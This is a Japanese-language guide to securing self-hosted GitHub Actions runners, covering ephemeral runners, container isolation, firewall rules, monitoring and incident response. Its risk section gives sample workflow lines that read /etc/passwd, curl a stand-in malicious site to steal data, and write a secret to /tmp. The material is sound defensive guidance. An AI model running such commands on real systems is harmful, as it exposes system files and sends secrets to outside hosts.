# Runner Security Guide

セルフホストランナーのセキュリティ強化、分離戦略、エフェメラルランナー実装ガイド。

## 目次

- [セキュリティリスク](#セキュリティリスク)
- [基本的なセキュリティ対策](#基本的なセキュリティ対策)
- [エフェメラルランナー](#エフェメラルランナー)
- [コンテナ分離](#コンテナ分離)
- [ネットワークセキュリティ](#ネットワークセキュリティ)
- [監視とログ](#監視とログ)

## セキュリティリスク

### 主要なリスク

#### 1. コード実行リスク

```yaml
# リスク: ワークフローは任意のコードを実行できる
jobs:
  malicious:
    runs-on: self-hosted
    steps:
      - name: Potentially dangerous
        run: |
          # ホストシステムにアクセス可能
          cat /etc/passwd
          curl malicious-site.com/steal-data
```

#### 2. シークレット漏洩

```yaml
# リスク: シークレットがログやファイルシステムに漏洩
jobs:
  leak:
    runs-on: self-hosted
    steps:
      - name: Secret exposure
        run: |
          echo ${{ secrets.API_KEY }} > /tmp/leaked.txt
```

#### 3. 環境汚染

```yaml
# リスク: 前のジョブの成果物が残る
jobs:
  build1:
    runs-on: self-hosted
    steps:
      - run: echo "secret" > secret.txt

  build2:  # 同じランナーで実行される可能性
    runs-on: self-hosted
    steps:
      - run: cat secret.txt  # 前のジョブのファイルにアクセス可能
```

#### 4. 権限昇格

```bash
# リスク: ランナーユーザーが過剰な権限を持つ
sudo access → システム全体にアクセス可能
docker access → コンテナ脱出の可能性
```

## 基本的なセキュリティ対策

### 1. 専用ユーザーで実行

```bash
# 権限を制限した専用ユーザーを作成
sudo useradd -m -s /bin/bash github-runner

# sudo 権限を与えない
# docker グループにも慎重に追加
```

### 2. 最小権限の原則

```bash
# ファイルシステム権限を制限
chmod 700 /opt/actions-runner
chown github-runner:github-runner /opt/actions-runner

# 作業ディレクトリの権限
chmod 755 /opt/actions-runner/_work
```

### 3. ネットワーク分離

```bash
# iptables でアウトバウンド接続を制限
sudo iptables -A OUTPUT -m owner --uid-owner github-runner -d github.com -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner github-runner -d *.pkg.github.com -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner github-runner -j DROP
```

### 4. パブリックリポジトリでは使用しない

```yaml
# ⚠️ 危険: パブリックリポジトリでセルフホストランナー使用
# 誰でもプルリクエスト経由で任意のコードを実行可能

# ✅ 安全: プライベートリポジトリのみ
# または、承認プロセスを設定
```

## エフェメラルランナー

### 概要

ジョブ実行後に自動的に削除されるランナー。

### メリット

```yaml
Security:
  - クリーンな環境で毎回実行
  - 前のジョブの成果物が残らない
  - シークレット漏洩リスク低減

Maintenance:
  - 環境のドリフト防止
  - 一貫した実行環境
  - ディスク容量管理不要
```

### 実装方法

#### 基本的なエフェメラル設定

```bash
# --ephemeral フラグを使用
./config.sh \
  --url https://github.com/owner/repo \
  --token TOKEN \
  --ephemeral \
  --name ephemeral-runner
```

#### systemd + エフェメラル

```bash
# スクリプト: /opt/actions-runner/start-ephemeral.sh
#!/bin/bash

while true; do
  # 新しいトークンを取得（APIまたは外部システムから）
  TOKEN=$(get_registration_token)

  # エフェメラルランナーを設定
  ./config.sh \
    --url https://github.com/owner/repo \
    --token "$TOKEN" \
    --ephemeral \
    --unattended \
    --name "ephemeral-$(date +%s)"

  # ランナーを実行（1ジョブ後に終了）
  ./run.sh

  # 設定をクリーンアップ
  ./config.sh remove --token "$TOKEN"

  # 作業ディレクトリをクリーンアップ
  rm -rf _work/*
done
```

```ini
# /etc/systemd/system/github-runner-ephemeral.service
[Unit]
Description=GitHub Actions Ephemeral Runner
After=network.target

[Service]
Type=simple
User=github-runner
WorkingDirectory=/opt/actions-runner
ExecStart=/opt/actions-runner/start-ephemeral.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

#### Docker + エフェメラル

```dockerfile
# Dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    curl \
    sudo \
    git \
    jq \
    && rm -rf /var/lib/apt/lists/*

# ランナーをダウンロード
RUN mkdir /actions-runner && cd /actions-runner \
    && curl -o actions-runner-linux-x64-2.311.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz \
    && tar xzf actions-runner-linux-x64-2.311.0.tar.gz \
    && rm actions-runner-linux-x64-2.311.0.tar.gz

WORKDIR /actions-runner

# エントリーポイント
COPY start.sh /start.sh
RUN chmod +x /start.sh

ENTRYPOINT ["/start.sh"]
```

```bash
# start.sh
#!/bin/bash
set -e

# 環境変数から設定を取得
REPO_URL="${REPO_URL}"
TOKEN="${RUNNER_TOKEN}"

# ランナーを設定
./config.sh \
  --url "$REPO_URL" \
  --token "$TOKEN" \
  --ephemeral \
  --unattended \
  --name "ephemeral-docker-$(hostname)"

# 1ジョブを実行（終了後コンテナも停止）
./run.sh

# クリーンアップ
./config.sh remove --token "$TOKEN"
```

```bash
# 実行
docker run -d \
  -e REPO_URL=https://github.com/owner/repo \
  -e RUNNER_TOKEN=YOUR_TOKEN \
  --name github-runner \
  github-runner:ephemeral
```

#### Kubernetes + エフェメラル

```yaml
# runner-job.yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: github-runner
spec:
  template:
    spec:
      containers:
      - name: runner
        image: github-runner:ephemeral
        env:
        - name: REPO_URL
          value: "https://github.com/owner/repo"
        - name: RUNNER_TOKEN
          valueFrom:
            secretKeyRef:
              name: github-runner-token
              key: token
      restartPolicy: OnFailure
```

## コンテナ分離

### Docker-in-Docker（DinD）

```yaml
# docker-compose.yml
version: '3.8'

services:
  runner:
    build: .
    privileged: true  # Docker実行に必要
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    environment:
      - REPO_URL=https://github.com/owner/repo
      - RUNNER_TOKEN=${RUNNER_TOKEN}
    restart: unless-stopped
```

### Rootless Docker

```bash
# より安全な Rootless Docker を使用
# インストール
curl -fsSL https://get.docker.com/rootless | sh

# ランナー用ユーザーで Docker を実行
export DOCKER_HOST=unix:///run/user/1000/docker.sock
```

### Podman（Rootless コンテナ）

```bash
# Podman はデフォルトで rootless
# セキュリティがより高い

# インストール
sudo apt-get install -y podman

# ランナーから使用
podman run ...
```

## ネットワークセキュリティ

### ファイアウォール設定

#### iptables（Linux）

```bash
# デフォルトで拒否
sudo iptables -P OUTPUT DROP

# GitHub への接続を許可
sudo iptables -A OUTPUT -d github.com -j ACCEPT
sudo iptables -A OUTPUT -d *.pkg.github.com -j ACCEPT
sudo iptables -A OUTPUT -d objects.githubusercontent.com -j ACCEPT

# 必要な外部サービスのみ許可
sudo iptables -A OUTPUT -d registry.npmjs.org -j ACCEPT
sudo iptables -A OUTPUT -d pypi.org -j ACCEPT

# ローカルネットワークを許可
sudo iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
sudo iptables -A OUTPUT -d 172.16.0.0/12 -j ACCEPT
sudo iptables -A OUTPUT -d 192.168.0.0/16 -j ACCEPT

# DNS を許可
sudo iptables -A OUTPUT -p udp --dport 53 -j ACCEPT

# 設定を保存
sudo iptables-save > /etc/iptables/rules.v4
```

#### UFW（Ubuntu Firewall）

```bash
# デフォルトポリシー
sudo ufw default deny outgoing
sudo ufw default deny incoming

# GitHub への接続を許可
sudo ufw allow out to github.com
sudo ufw allow out 443/tcp

# 設定を有効化
sudo ufw enable
```

### VPN/プロキシ

```bash
# VPN経由でのみ外部接続を許可
# プロキシ設定
export http_proxy="http://proxy.company.com:8080"
export https_proxy="http://proxy.company.com:8080"
export no_proxy="localhost,127.0.0.1,.company.local"

# ランナー設定に追加
./config.sh \
  --url https://github.com/owner/repo \
  --token TOKEN \
  --proxyurl http://proxy.company.com:8080
```

## 監視とログ

### ログ記録

```bash
# systemd ログ
sudo journalctl -u actions.runner.* -f

# ファイルベースログ
tail -f /opt/actions-runner/_diag/Runner_*.log
tail -f /opt/actions-runner/_diag/Worker_*.log
```

### セキュリティ監視

```bash
# auditd でファイルアクセスを監視
sudo apt-get install auditd

# ランナーディレクトリを監視
sudo auditctl -w /opt/actions-runner/_work -p wa -k github-runner

# ログ確認
sudo ausearch -k github-runner
```

### アラート設定

```bash
# 疑わしいアクティビティを検出
# /opt/actions-runner/monitor.sh
#!/bin/bash

# 高いCPU使用率を検出
CPU_USAGE=$(top -bn1 | grep "github-runner" | awk '{print $9}')
if (( $(echo "$CPU_USAGE > 90" | bc -l) )); then
  echo "High CPU usage: $CPU_USAGE%" | mail -s "Runner Alert" admin@company.com
fi

# 不正なネットワーク接続を検出
netstat -tupn | grep github-runner | grep -v "github.com\|githubusercontent.com" && \
  echo "Suspicious network connection" | mail -s "Security Alert" admin@company.com
```

## セキュリティチェックリスト

### 必須対策

- [ ] プライベートリポジトリでのみ使用
- [ ] 専用ユーザーで実行（sudo権限なし）
- [ ] エフェメラルモード使用（可能な場合）
- [ ] 最新版のランナーを使用
- [ ] ファイアウォール設定
- [ ] ログ監視設定

### 推奨対策

- [ ] コンテナ分離（Docker/Podman）
- [ ] ネットワーク分離（VPN/プロキシ）
- [ ] Rootless コンテナ使用
- [ ] 定期的なセキュリティパッチ適用
- [ ] 作業ディレクトリの定期的なクリーンアップ
- [ ] アクセスログの監査

### 高度な対策

- [ ] SELinux/AppArmor 有効化
- [ ] 暗号化された作業ディレクトリ
- [ ] ハードウェアトークン認証
- [ ] マルチテナント分離
- [ ] Kubernetes での実行
- [ ] 自動脆弱性スキャン

## インシデント対応

### 侵害の兆候

```bash
# 1. 異常なネットワークトラフィック
sudo iftop -i eth0

# 2. 不正なプロセス
ps aux | grep github-runner

# 3. ファイルシステムの変更
sudo find /opt/actions-runner -type f -mtime -1

# 4. 不正なcronジョブやsystemdサービス
systemctl list-units --type=service | grep -v "github"
crontab -u github-runner -l
```

### 対応手順

```bash
# 1. ランナーを即座に停止
sudo systemctl stop actions.runner.*

# 2. ネットワーク接続を遮断
sudo iptables -A OUTPUT -m owner --uid-owner github-runner -j DROP

# 3. ログを保存
sudo cp -r /opt/actions-runner/_diag /backup/incident-$(date +%Y%m%d)
sudo journalctl -u actions.runner.* > /backup/systemd-$(date +%Y%m%d).log

# 4. フォレンジック分析
sudo last -u github-runner
sudo ausearch -k github-runner

# 5. ランナーを削除して再構築
sudo ./config.sh remove --token TOKEN
sudo rm -rf /opt/actions-runner
# 新規セットアップ
```

## ベストプラクティスサマリー

### DO（推奨）

```yaml
✅ プライベートリポジトリでのみ使用
✅ エフェメラルランナーを優先
✅ 専用ユーザーで実行（最小権限）
✅ コンテナ分離を使用
✅ ネットワークアクセスを制限
✅ 定期的なセキュリティ更新
✅ 包括的なログ記録と監視
✅ シークレットの適切な管理
```

### DON'T（禁止）

```yaml
❌ パブリックリポジトリで使用
❌ root ユーザーで実行
❌ 永続的ランナーをデフォルトで使用
❌ 無制限のネットワークアクセス
❌ docker グループへの無条件な追加
❌ 古いバージョンの放置
❌ ログ監視の欠如
❌ シークレットのハードコーディング
```
